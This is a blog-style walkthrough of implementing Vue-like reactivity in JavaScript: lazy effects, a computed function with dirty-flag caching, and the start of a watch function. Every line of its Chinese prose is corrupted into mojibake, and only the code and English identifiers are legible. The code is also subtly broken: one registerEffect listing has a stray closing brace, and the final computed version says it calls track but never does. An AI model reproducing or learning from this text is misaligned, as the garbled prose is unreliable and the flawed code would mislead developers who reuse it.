<p>æˆ‘ä»¬åœ¨æ‰§è¡ŒisFlushing çš„æ—¶å€™è¿›è¡Œäº†æ‹¦æˆª ä¸ä¼šå¤šæ¬¡è°ƒç”¨ï¼Œå¦å¤–ä¸€ä¸ªæˆ‘ä»¬è™½ç„¶æ·»åŠ äº†å¤šæ¬¡ï¼Œç”±äºsetçš„ç‰¹æ€§ï¼Œé‡Œé¢å§‹ç»ˆåªæœ‰ä¸€ä¸ªï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå¤šæ¬¡æ‰§è¡Œï¼Œè€Œæ˜¯åªä¼šæ‹¿åˆ°å®ƒçš„æœ€ç»ˆå¤ªã€‚</p>
<p>æœ‰ä¸€ç‚¹å·§å¦™å•Š å±…ç„¶è¿˜ç”¨åˆ°äº†å¾®æœåŠ¡çš„ç‰¹æ€§ã€‚</p>
<blockquote>
<p>ä¹¦ä¸ŠåŸæ–‡çš„è¯´æ˜ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ae891e0be6149f3b3fea3cb5e37bb62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo6aOe6aOe6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666076&amp;x-signature=c2WYmGvP%2BG%2FFERVnC%2F9nnamOUN0%3D" alt="" loading="lazy"/></p>
</blockquote>
<h2 data-id="heading-14">08-è®¡ç®—å±æ€§computed ä¸ lazy</h2>
<p>æˆ‘ä»¬ç°åœ¨çš„ä»£ç æ˜¯ä¼šç«‹å³æ‰§è¡Œä¼ é€’ç»™å®ƒçš„å‰¯ä½œç”¨å‡½æ•°</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">registerEffect</span>(()=&gt;{
    <span class="hljs-comment">//...</span>
})
</code></pre>
<h3 data-id="heading-15">ä¸ºä»€ä¹ˆä¼šç«‹å³æ‰§è¡Œå‘¢ï¼Ÿ</h3>
<p>å› ä¸ºæˆ‘ä»¬åœ¨æ³¨å†Œå‡½æ•°çš„æ—¶å€™ï¼Œéœ€è¦å…ˆè§¦å‘ä¸€æ¬¡å‡½æ•°ï¼ŒæŠŠå¯¹åº”çš„å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°è§¦å‘çš„æ‹¦æˆªå¯¹è±¡çš„ å¯¹åº”çš„å±æ€§ä¸Šï¼ŒæŠŠå‰¯ä½œç”¨å‡½æ•°æŒ‚è½½ä¸Šå»ã€‚</p>
<p>ç°åœ¨æˆ‘ä»¬å¸Œæœ›èƒ½å¤Ÿæ‡’æ‰§è¡Œï¼Œåœ¨éœ€è¦çš„æ—¶å€™æ‰§è¡Œï¼Œé‚£ä¹ˆåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<p>å¯ä»¥å‚è€ƒæˆ‘ä»¬ä¸Šé¢çš„è°ƒåº¦å™¨ï¼Œæˆ‘ä»¬ä¼ é€’ä¸€ä¸ªlazyçš„å‚æ•°ç»™optionsï¼Œåœ¨æ‰§è¡Œçš„æ—¶å€™åˆ¤æ–­ï¼Œå¦‚æœæœ‰è¿™ä¸ªå±æ€§ï¼Œæˆ‘ä»¬å°±ä¸æ‰§è¡Œ</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-comment">//...</span>
},{
    <span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>
})
</code></pre>
<h3 data-id="heading-16">å¦‚ä½•å®ç°æ‡’æ‰§è¡Œå‘¢ï¼Ÿ</h3>
<pre><code class="hljs language-javascript" lang="javascript">  <span class="hljs-title function_">registerEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">foo</span>)
      },{
    <span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>
  })
</code></pre>
<p>æ³¨å†Œå‡½æ•°çš„å®ç°</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
   const registerEffect=(fn,options = {})=&gt;{
       if (!fn) return ;
       const effectFn=()=&gt;{
          <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
          <span class="hljs-built_in">cleanup</span>(effectFn)
          <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
          activeEffect = effectFn;
          <span class="hljs-comment">//åœ¨è°ƒç”¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ ˆä¸­</span>
          effectStack<span class="hljs-selector-class">.push</span>(activeEffect)
          <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
          <span class="hljs-built_in">fn</span>()
           <span class="hljs-comment">//åœ¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°å¼¹å‡ºæ ˆ</span>
           effectStack<span class="hljs-selector-class">.pop</span>()
           <span class="hljs-comment">//å–å‡ºå‹åœ¨æ ˆåº•çš„å€¼</span>
           activeEffect = effectStack<span class="hljs-selector-attr">[effectStack.length-1]</span>
           }
          <span class="hljs-comment">//å°†optionsæŒ‚åœ¨åˆ°å¯¹åº”çš„effectFnä¸Šé¢</span>
           effectFn<span class="hljs-selector-class">.options</span> = options
          <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
           effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
           <span class="hljs-comment">//add--æ‰§è¡Œè¯¥å‡½æ•°</span>
           <span class="hljs-built_in">if</span>(!options.lazy){
               <span class="hljs-built_in">effectFn</span>()
           }
           <span class="hljs-comment">//add--å°†å‰¯ä½œç”¨å‡½æ•°ä½œä¸ºè¿”å›å€¼è¿”å›</span>
           return effectFn
       }
   }
</code></pre>
<p>æˆ‘ä»¬ç°åœ¨ä»£ç æ˜¯æ‡’æ‰§è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å…·ä½“ä»€ä¹ˆæ—¶å€™æ‰§è¡Œå‘¢ï¼Ÿ</p>
<p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å®é™…ä¸Šè¿”å›äº†å‰¯ä½œç”¨å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå·±æ‰‹åŠ¨æ‰§è¡Œï¼Œä½†æ˜¯è¿™æ ·åšæœ‰ä»€ä¹ˆæ„ä¹‰å‘¢ï¼Ÿ</p>
<h3 data-id="heading-17">å¦‚æœæˆ‘ä»¬æŠŠè¿™ä¸ªè¿”å›çš„å€¼ä½œä¸ºä¸€ä¸ªgetterå‡½æ•°å‘¢ï¼Ÿè¿™æ ·å°±å¯ä»¥è¿”å›ä»»ä½•å€¼äº†</h3>
<blockquote>
<p>AI:è¿™å¥è¯çš„æ„æ€æ˜¯åœ¨æ„å»ºå“åº”å¼ç³»ç»Ÿæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†å‰¯ä½œç”¨å‡½æ•°è®¾è®¡ä¸ºä¸€ä¸ªè®¿é—®å™¨å±æ€§ï¼ˆgetterï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œè¿™æ ·æ¯æ¬¡è®¿é—®è¯¥å±æ€§æ—¶ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°ï¼Œè¿›è€Œå¯ä»¥åŠ¨æ€åœ°â€œè·å–â€æˆ–è®¡ç®—å‡ºæŸä¸ªå€¼ã€‚è¿™é‡Œçš„â€œè¿”å›ä»»ä½•å€¼â€æ„å‘³ç€å‰¯ä½œç”¨å‡½æ•°å†…éƒ¨å¯ä»¥è¿›è¡Œå¤æ‚çš„é€»è¾‘å¤„ç†ï¼Œæœ€ç»ˆè®¡ç®—å¹¶è¿”å›æ‰€éœ€çš„æ•°æ®æˆ–ç»“æœã€‚</p>
<p>å…·ä½“åˆ°Vueæˆ–ç±»ä¼¼çš„æ¡†æ¶ä¸­ï¼Œå½“æåˆ°â€œå‰¯ä½œç”¨å‡½æ•°ä½œä¸ºä¸€ä¸ªgetterå‡½æ•°â€ï¼Œé€šå¸¸æ˜¯æŒ‡åœ¨å®ç°è®¡ç®—å±æ€§ï¼ˆå¦‚Vueä¸­çš„computedï¼‰çš„åœºæ™¯ã€‚è®¡ç®—å±æ€§æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªä¾èµ–å…¶ä»–æ•°æ®çš„getterå‡½æ•°ï¼Œå®ƒè¿”å›çš„å€¼æ˜¯åŸºäºå…¶ä»–æ•°æ®è®¡ç®—å¾—å‡ºçš„ã€‚ä¾‹å¦‚ï¼Œä½ å¯èƒ½æœ‰ä¾èµ–äºå¤šä¸ªçŠ¶æ€å€¼çš„è®¡ç®—é€»è¾‘ï¼Œè¿™ä¸ªè®¡ç®—é€»è¾‘å°è£…åœ¨getterä¸­ï¼Œæ¯å½“ä¾èµ–çš„æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼Œgetterå°±ä¼šé‡æ–°æ‰§è¡Œï¼Œè®¡ç®—å‡ºæ–°çš„ç»“æœå¹¶è¿”å›ã€‚</p>
<p>ç®€è€Œè¨€ä¹‹ï¼Œè¿™ç§æ–¹å¼å…è®¸æˆ‘ä»¬å°è£…æ•°æ®å¤„ç†é€»è¾‘ï¼Œå¹¶ä¸”è¿™ä¸ªé€»è¾‘çš„æ‰§è¡Œï¼ˆå³å‰¯ä½œç”¨çš„å‘ç”Ÿï¼‰æ˜¯ç”±å¯¹æŸä¸ªå±æ€§çš„è®¿é—®è‡ªåŠ¨è§¦å‘çš„ï¼Œè€Œè¿™ä¸ªå±æ€§ä»¿ä½›å…·æœ‰äº†â€œåŠ¨æ€è®¡ç®—â€çš„èƒ½åŠ›ï¼Œå¯ä»¥æ ¹æ®åº•å±‚æ•°æ®çš„å˜åŒ–å®æ—¶æ›´æ–°å…¶å€¼ã€‚å› æ­¤ï¼Œâ€œæŠŠå‰¯ä½œç”¨å‡½æ•°ä½œä¸ºä¸€ä¸ªgetterå‡½æ•°â€æ˜¯ä¸€ç§å®ç°åŠ¨æ€æ•°æ®ç»‘å®šå’Œè‡ªåŠ¨æ›´æ–°çš„æœ‰æ•ˆç­–ç•¥ã€‚</p>
</blockquote>
<p>ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">effectFn</span> = effect(()=&gt;obj.foo+obj.bar,{lazy:<span class="hljs-literal">true</span>})
</code></pre>
<p>è¿™æ ·æˆ‘ä»¬æ‰‹åŠ¨æ‰§è¡Œå‡½æ•°çš„æ—¶å€™ å°±èƒ½æ‹¿åˆ°è¿”å›å€¼äº†</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">res</span> = effectFn()
</code></pre>
<p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦æŠŠæˆ‘ä»¬çš„æ³¨å†Œå‡½æ•°è¿›è¡Œæ”¹é€ ä¸€ä¸‹ï¼Œæ—¢ç„¶éœ€è¦æŠŠæ‰§è¡Œç»“æœçš„æ•°æ®è¿”å›ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦åœ¨æˆ‘ä»¬çœŸæ­£çš„å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œçš„åœ°æ–¹åŠ¨æ‰‹è„šã€‚</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//æ³¨å†Œå‡½æ•°</span>
   const registerEffect=(fn,options = {})=&gt;{
   if (!fn) return ;
   const effectFn=()=&gt;{
          <span class="hljs-comment">//è°ƒç”¨clean æ¸…é™¤ å…³äºeffectFn çš„ç›¸å…³è”çš„ä¾èµ–</span>
          <span class="hljs-built_in">cleanup</span>(effectFn)
          <span class="hljs-comment">//å½“effectFnæ‰§è¡Œæ—¶ï¼Œå°†å…¶è®¾ç½®ä¸ºå½“å‰æ¿€æ´»çš„å‰¯ä½œç”¨å‡½æ•°</span>
          activeEffect = effectFn;
          <span class="hljs-comment">//åœ¨è°ƒç”¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°æ·»åŠ åˆ°æ ˆä¸­</span>
          effectStack<span class="hljs-selector-class">.push</span>(activeEffect)
          <span class="hljs-comment">//è°ƒç”¨è¯¥å‡½æ•° è§¦å‘ä»£ç†å¯¹è±¡çš„getå‡½æ•° æ·»åŠ åˆ°æ¡¶é‡Œé¢</span>
          <span class="hljs-comment">//add--å°†fnçš„æ‰§è¡Œç»“æœå­˜å‚¨åˆ°resä¸­</span>
          const res = <span class="hljs-built_in">fn</span>()
           <span class="hljs-comment">//åœ¨å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œå®Œæ¯•ä¹‹åï¼ŒæŠŠå½“å‰å‰¯ä½œç”¨å‡½æ•°å¼¹å‡ºæ ˆ</span>
           effectStack<span class="hljs-selector-class">.pop</span>()
           <span class="hljs-comment">//å–å‡ºå‹åœ¨æ ˆåº•çš„å€¼</span>
           activeEffect = effectStack<span class="hljs-selector-attr">[effectStack.length-1]</span>
           <span class="hljs-comment">//addå°†res ä½œä¸º effectFnçš„è¿”å›å€¼ã€‚</span>
           return res;
       }
       <span class="hljs-comment">//å°†optionsæŒ‚åœ¨åˆ°å¯¹åº”çš„effectFnä¸Šé¢</span>
       effectFn<span class="hljs-selector-class">.options</span> = options
       <span class="hljs-comment">//ç”¨æ¥å­˜å‚¨æ‰€æœ‰ä¸è¯¥å‰¯ä½œç”¨å‡½æ•°ç›¸å…³è”çš„ä¾èµ–é›†åˆ</span>
       effectFn<span class="hljs-selector-class">.deps</span> = <span class="hljs-selector-attr">[]</span>
       <span class="hljs-comment">//add--æ‡’æ‰§è¡Œè¯¥å‡½æ•°</span>
       <span class="hljs-built_in">if</span>(!options.lazy){
              <span class="hljs-built_in">effectFn</span>()
       }
       <span class="hljs-comment">//add--å°†å‰¯ä½œç”¨å‡½æ•°ä½œä¸ºè¿”å›å€¼è¿”å›</span>
        return effectFn
   }
</code></pre>
<p>æˆ‘ä»¬çœŸæ­£çš„å‰¯ä½œç”¨å‡½æ•°å…¶å®æ˜¯fn ï¼Œè€ŒeffectFnæ˜¯æˆ‘ä»¬çš„åŒ…è£…çš„ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨resä¸´æ—¶ä¿å­˜æ‰§è¡Œç»“æœï¼Œå¹¶åœ¨æœ€åè¿”å›ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å»çœŸæ­£çš„å®ç°è®¡ç®—å‡½æ•°äº†</p>
<h3 data-id="heading-18">è®¡ç®—å‡½æ•° computed</h3>
<p>å®ƒçš„å‚æ•°æ˜¯ä¸€ä¸ªæ˜¯ä¸€ä¸ªgetterå‡½æ•°ï¼Œæˆ‘ä»¬ç”¨getterå‡½æ•°ä½œä¸ºå‰¯ä½œç”¨å‚æ•°ï¼Œç”¨å®ƒåˆ›å»ºä¸€ä¸ªlazy çš„effect ,computedå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œè¯¥å¯¹è±¡çš„valueå±æ€§æ˜¯ä¸€ä¸ªè®¿é—®å™¨å±æ€§ï¼Œåªæœ‰å½“è¯»å–valueå€¼çš„æ—¶å€™ï¼Œæ‰ä¼šæ‰§è¡ŒeffectFn å¹¶å°†å…¶ç»“æœè¿”å›</p>
<pre><code class="hljs language-javascript" lang="javascript"> <span class="hljs-comment">/**
* å®ç°ä¸€ä¸ªè®¡ç®—å‡½æ•°
*  <span class="hljs-doctag">@param</span>  <span class="hljs-variable">getter</span>
*  <span class="hljs-doctag">@return</span>  {<span class="hljs-type"> {readonly value: * </span>}|*}
*/</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">computed</span>(<span class="hljs-params">getter</span>){
   <span class="hljs-comment">//æŠŠgetterä½œä¸ºå‰¯ä½œç”¨å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªlazyçš„effect</span>
       <span class="hljs-keyword">const</span> effectFn = <span class="hljs-title function_">registerEffect</span>(getter,{<span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>})
       <span class="hljs-comment">//å½“è¯»å–valueæ—¶æ‰æ‰§è¡ŒeffectFn</span>
       <span class="hljs-keyword">const</span> obj = {
       <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>(){
         <span class="hljs-keyword">return</span> <span class="hljs-title function_">effectFn</span>()
           }
       }
       <span class="hljs-keyword">return</span> obj
   }
</code></pre>
<p>æ‰§è¡Œç»“æœï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> sunRes = <span class="hljs-title function_">computed</span>(<span class="hljs-function">()=&gt;</span>obj.<span class="hljs-property">foo</span>+obj.<span class="hljs-property">bar</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sunRes.<span class="hljs-property">value</span>)
<span class="hljs-comment">//3</span>
</code></pre>
<p>å½“æˆ‘ä»¬è¯»å–sunRes.valueçš„æ—¶å€™ï¼Œè§¦å‘è¯¥å¯¹è±¡çš„getterå‡½æ•°ï¼Œå®ƒçš„getterå‡½æ•°å°±æ˜¯æˆ‘ä»¬æ³¨å†Œçš„å¹¶è¿”å›çš„æ‡’æ‰§è¡Œå‡½æ•°effectFnï¼Œæˆ‘ä»¬åœ¨å…¶å†…éƒ¨å·²ç»å®ç°äº†ï¼ŒåŒ…è£…çš„effectFnçš„æ‰§è¡Œä¼šè¿”å›å…¶å†…éƒ¨çœŸæ­£çš„å‰¯ä½œç”¨å‡½æ•°çš„æ‰§è¡Œç»“æœã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å°±å®ç°äº†<strong>è®¡ç®—å‡½æ•°</strong>ï¼Œå“ˆå“ˆå“ˆå“ˆï¼ğŸ˜„ğŸ˜„ğŸ˜„ğŸ˜„ğŸ˜„</p>
<h3 data-id="heading-19">å¯¹å€¼è¿›è¡Œç¼“å†²</h3>
<p>æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸€ä¸ªå“¨å…µå’Œç¼“å†²æ¥å®ç°è¯¥æ•ˆæœã€‚</p>
<p>å½“æˆ‘ä»¬çš„å“¨å…µdirtyä¸ºtrueçš„æ—¶å€™ æˆ‘ä»¬å°±é‡æ–°è·å–æ•°æ®ï¼Œå¦‚æœæ˜¯falseå°±ä¸æ‰§è¡Œï¼Œvalueåˆ™å¯¹ä¸Šæ¬¡çš„æ•°æ®è¿›è¡Œç¼“å†²ã€‚</p>
<p>å¦‚æœå±æ€§æ²¡æœ‰å‘ç”Ÿæ›´æ–° ï¼Œæˆ‘ä»¬ç›´æ¥è¿”å›ä¸Šæ¬¡çš„å€¼ï¼Œå¦‚æœæœ‰åˆ™æ›´æ–°ã€‚</p>
<p>é‚£ä¹ˆå±æ€§æ›´æ–°çš„æ—¶å€™ï¼Œæ€ä¹ˆé€šçŸ¥æˆ‘ä»¬å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥é€šè¿‡æ³¨è°ƒåº¦å™¨æ¥å®ç°è¯¥æ•ˆæœã€‚</p>
<p>å½“å±æ€§å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå¦‚æœæˆ‘ä»¬å®ç°äº†è°ƒåº¦å™¨ï¼Œä¼šæ‰§è¡Œè°ƒåº¦å™¨ï¼Œæˆ‘ä»¬æ­£å¥½åœ¨è¿™é‡Œæ¥é‡ç½®å“¨å…µdirty.</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">computed</span>(<span class="hljs-params">getter</span>){
   <span class="hljs-comment">//ç¼“å†²å€¼</span>
   <span class="hljs-keyword">let</span> value ;
   <span class="hljs-comment">//ç”¨æ¥æ ‡è¯†æ˜¯å¦éœ€è¦é‡æ–°è®¡ç®— å½“ä¸ºtrueçš„æ—¶å€™ å°±æ˜¯éœ€è¦é‡æ–°è®¡ç®—</span>
   <span class="hljs-keyword">let</span> dirty = <span class="hljs-literal">true</span>;
   <span class="hljs-comment">//æŠŠgetterä½œä¸ºå‰¯ä½œç”¨å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªlazyçš„effect</span>
       <span class="hljs-keyword">const</span> effectFn = <span class="hljs-title function_">registerEffect</span>(getter,{
      <span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>,
      <span class="hljs-title function_">scheduler</span>(<span class="hljs-params"/>){
               <span class="hljs-comment">//åœ¨è°ƒåº¦å™¨é‡Œé¢ é‡ç½® dirty</span>
               <span class="hljs-comment">//å½“ä¾èµ–çš„å±æ€§å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ ä¼šè§¦å‘è°ƒåº¦å™¨çš„æ‰§è¡Œã€‚</span>
               dirty = <span class="hljs-literal">true</span>
           }
       })
       <span class="hljs-comment">//å½“è¯»å–valueæ—¶æ‰æ‰§è¡ŒeffectFn</span>
       <span class="hljs-keyword">const</span> obj = {
       <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>(){
         <span class="hljs-keyword">if</span>(dirty){
            value = <span class="hljs-title function_">effectFn</span>()
                   dirty = <span class="hljs-literal">false</span>
               }
         <span class="hljs-keyword">return</span> value
           }
       }
       <span class="hljs-keyword">return</span> obj
   }
</code></pre>
<h3 data-id="heading-20">åœ¨æ³¨å†Œå‡½æ•°ä¸­è¯»å–è®¡ç®—å±æ€§æ—¶</h3>
<p>å¥½å¤´ç–¼ ï¼Œæ„Ÿè§‰è¦é•¿è„‘å­ï¼</p>
<p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªeff ect ä¸­è¯»å–è®¡ç®—å±æ€§çš„æ—¶å€™ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">const sunRes = <span class="hljs-built_in">computed</span>(()=&gt;obj<span class="hljs-selector-class">.foo</span>+obj<span class="hljs-selector-class">.bar</span>)
<span class="hljs-built_in">effect</span>(()=&gt;{
    <span class="hljs-comment">//åœ¨è¯¥å‰¯ä½œç”¨å‡½æ•°ä¸­è¯»å–sumRes.value</span>
    console<span class="hljs-selector-class">.log</span>(sunRes.value)
})
<span class="hljs-comment">//ä¿®æ”¹obj.fooçš„å€¼</span>
obj<span class="hljs-selector-class">.foo</span>++
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b0aca29808b4fd5a6a1a589516b757a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zuo6aOe6aOe6Zuo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666076&amp;x-signature=SflQuq%2FUEsXJEs5hn%2BNuS2ngjt4%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">computed</span>(<span class="hljs-params">getter</span>){
   <span class="hljs-comment">//ç¼“å†²å€¼</span>
   <span class="hljs-keyword">let</span> value ;
   <span class="hljs-comment">//ç”¨æ¥æ ‡è¯†æ˜¯å¦éœ€è¦é‡æ–°è®¡ç®— å½“ä¸ºtrueçš„æ—¶å€™ å°±æ˜¯éœ€è¦é‡æ–°è®¡ç®—</span>
   <span class="hljs-keyword">let</span> dirty = <span class="hljs-literal">true</span>;
   <span class="hljs-comment">//æŠŠgetterä½œä¸ºå‰¯ä½œç”¨å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªlazyçš„effect</span>
       <span class="hljs-keyword">const</span> effectFn = <span class="hljs-title function_">registerEffect</span>(getter,{
      <span class="hljs-attr">lazy</span>:<span class="hljs-literal">true</span>,
      <span class="hljs-title function_">scheduler</span>(<span class="hljs-params"/>){
         <span class="hljs-comment">//åœ¨è°ƒåº¦å™¨é‡Œé¢ é‡ç½® dirty</span>
               <span class="hljs-comment">//å½“ä¾èµ–çš„å±æ€§å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ ä¼šè§¦å‘è°ƒåº¦å™¨çš„æ‰§è¡Œã€‚</span>
         dirty = <span class="hljs-literal">true</span>
               <span class="hljs-comment">//å½“è®¡ç®—å±æ€§ä¾èµ–çš„å“åº”å¼æ•°æ®å˜åŒ–æ—¶ï¼Œæ‰‹åŠ¨è°ƒç”¨çš„triggerå‡½æ•°è§¦å‘å“åº”</span>
               <span class="hljs-title function_">trigger</span>(obj,<span class="hljs-string">'value'</span>)
           }
       })
       <span class="hljs-comment">//å½“è¯»å–valueæ—¶æ‰æ‰§è¡ŒeffectFn</span>
       <span class="hljs-keyword">const</span> obj = {
      <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>(){
         <span class="hljs-keyword">if</span>(dirty){
            value = <span class="hljs-title function_">effectFn</span>()
                   dirty = <span class="hljs-literal">false</span>
               }
         <span class="hljs-comment">//å½“è¯»å–valueæ—¶ï¼Œæ‰‹åŠ¨è°ƒç”¨trackå‡½æ•°è¿›è¡Œè¿½è¸ª</span>
         <span class="hljs-keyword">return</span> value
           }
       }
   <span class="hljs-keyword">return</span> obj
   }
</code></pre>
<h2 data-id="heading-21">09 - watchçš„å®ç°åŸç†</h2>
<h3 data-id="heading-22">watchçš„å®ç°åŸç†</h3>
<p><strong>æ‰€è°“çš„watchï¼Œå°±æ˜¯è§‚æµ‹ä¸€ä¸ªå“åº”å¼æ•°æ®ï¼Œå½“æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™é€šçŸ¥å¹¶æ‰§è¡Œç›¸åº”çš„å›è°ƒå‡½æ•°ã€‚</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">watch</span>(obj,<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ•°æ®å˜äº†'</span>)
})
<span class="hljs-comment">//ä¿®æ”¹å“åº”æ•°æ®å€¼ï¼Œä¼šå¯¼è‡´å›è°ƒå‡½æ•°æ‰§è¡Œã€‚</span>
</code></pre>
<p>é‚£æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ³¨å†Œå‰¯ä½œç”¨å‡½æ•°effectå’Œ options.schedulerã€‚</p>
<p>effectçš„æ³¨å†Œå‰¯ä½œç”¨ä¸å°±æ˜¯ è§‚å¯Ÿä¸€ä¸ªå“åº”å¼çš„æ•°æ®å—ï¼Œä½†æ˜¯å®ƒæ˜¯è‡ªåŠ¨æ‰§è¡Œå‰¯ä½œç”¨å‡½æ•°çš„ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯æƒ³è¦æ‰§è¡Œæˆ‘ä»¬è‡ªå·±çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æ³¨å†Œä¸€ä¸ªå‡½æ•°ï¼Œè®©å…¶èƒ½å¤Ÿç›´æ¥å›è°ƒã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¹‹å‰å®ç°çš„effectä¸­ï¼Œçš„å‰¯ä½œç”¨å‡½æ•°æ‰§è¡Œæ—¶æœºçš„å®ç°æœºåˆ¶ï¼Œschedulerå°±æ­£å¥½æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚</p>
<p><strong>æ‰€ä»¥ watch åŸç†çš„æœ¬è´¨å®é™…ä¸Šå…¶å®æ˜¯åˆ©ç”¨å‰¯ä½œç”¨å‡½æ•°ä»¥åŠå®ƒçš„æ‰§è¡Œæ—¶æœºschedulerå®Œæˆçš„ã€‚</strong></p>
<p>å…¶ä»–çš„åè€Œæ˜¯å¯¹å…¶è¿›è¡Œçš„è¿›ä¸€æ­¥ä¼˜åŒ–</p>
<pre><code class="hljs language-scss" lang="scss"> <span class="hljs-comment">/**
* ç®€å•çš„å®ç° ä½¿ç”¨effect ä»¥åŠoptions.scheduler
*/</span>
function <span class="hljs-built_in">watch</span>(source,callback){
       <span class="hljs-built_in">effect</span>(()=&gt;source<span class="hljs-selector-class">.foo</span>,{
       <span class="hljs-built_in">scheduler</span>(){
         <span class="hljs-comment">//å½“æ•°æ®å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæ‰§è¡Œå›è°ƒ</span>
           }
       })
   }
</code></pre>
<p>è§‚å¯Ÿä¸Šé¢çš„ä»£ç ï¼Œå‘ç°æˆ‘ä»¬çš„æ³¨å†Œä»£ç æ˜¯ç›´æ¥å†™æ­»çš„ã€‚</p>
<p>watchçš„æœ¬è´¨æ˜¯ è§‚å¯Ÿä¸€ä¸ªå¯å“åº”å¼å¯¹è±¡ï¼Œç„¶åæ‰§è¡Œç›¸åº”çš„æ“ä½œã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦å°è£…ä¸€ä¸ªé€šç”¨çš„è¯»å–æ“ä½œçš„å‡½æ•°ã€‚</p>
